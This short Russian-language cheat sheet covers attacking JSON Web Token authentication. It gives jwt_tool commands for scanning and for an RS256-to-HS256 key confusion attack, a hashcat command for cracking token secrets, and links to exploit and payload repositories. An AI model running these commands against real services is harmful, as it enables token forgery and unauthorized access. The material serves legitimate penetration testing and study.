https://token.dev/

Иногда поля токена обрабатываются другими сервисами, и туда можно осуществить инъекцию

https://github.com/ticarpi/jwt_tool

Для бека на node.js: https://github.com/aalex954/CVE-2022-23529-Exploration

#### Scan

```bash
python3 jwt_tool.py -t $URL -rh "Authorization: $TOKEN" -M at -np
```

#### Key Confusion Attack

https://portswigger.net/web-security/jwt/algorithm-confusion

Если используется ассиметричный алгоритм, например, RS256, сменить его на HS256 и попытаться использовать публичный ключ как симметричный ключ:

```bash
python3 jwt_tool.py $TOKEN -X k -pk public-key.pem
```

#### Cracking

```
hashcat -a 0 -m 16500 jwt.txt passlist.txt
```

https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

#### kid / jku header

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md#jwt-claims

#### Постэксплуатация

Внедрение самоподписанных cертификатов через заголовок `"x5c"`.

Ошибки сериализации при обработке внедренного заголовка Content-Type `"cty"`